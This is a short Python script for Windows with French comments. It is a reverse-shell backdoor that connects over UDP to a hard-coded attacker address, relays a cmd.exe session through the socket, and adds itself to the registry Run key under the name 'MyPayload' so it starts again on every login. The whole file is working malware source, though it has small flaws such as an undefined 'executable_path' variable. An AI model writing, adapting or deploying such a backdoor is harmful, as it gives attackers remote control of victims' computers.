import os
import socket
import subprocess
import threading
import time
import winreg as reg
def s2p(s, p, addr):
    try:
        while True:
            data, addr = s.recvfrom(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
    except Exception as e:
        print(f"Error in s2p: {e}")
        s.close()

def p2s(s, p, addr):
    try:
        while True:
            s.sendto(p.stdout.read(1), addr)
    except Exception as e:
        print(f"Error in p2s: {e}")
        s.close()

def add_to_startup():
    try:
    # Clé du registre pour l'exécution au démarrage
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        key_obj = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key_obj, "MyPayload", 0, reg.REG_SZ, executable_path)
        reg.CloseKey(key_obj)
    except Exception as e:
        print(f"Error adding to startup: {e}")
def main():
    add_to_startup()  # Ajouter le script au démarrage
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Utiliser UDP
            addr = ("192.168.92.130", 9002)  # Adresse IP et port de l'attaquant

            # Envoie un premier paquet pour établir la connexion
            s.sendto(b'Hello', addr)

            # Utiliser cmd.exe pour Windows
            p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

            s2p_thread = threading.Thread(target=s2p, args=(s, p, addr))
            s2p_thread.daemon = True
            s2p_thread.start()

            p2s_thread = threading.Thread(target=p2s, args=(s, p, addr))
            p2s_thread.daemon = True
            p2s_thread.start()

        
            p.wait()
        except Exception as e:
            print("Error: {e}")
        finally:
            s.close()
            time.sleep(5)

if __name__ == "__main__":
    main()
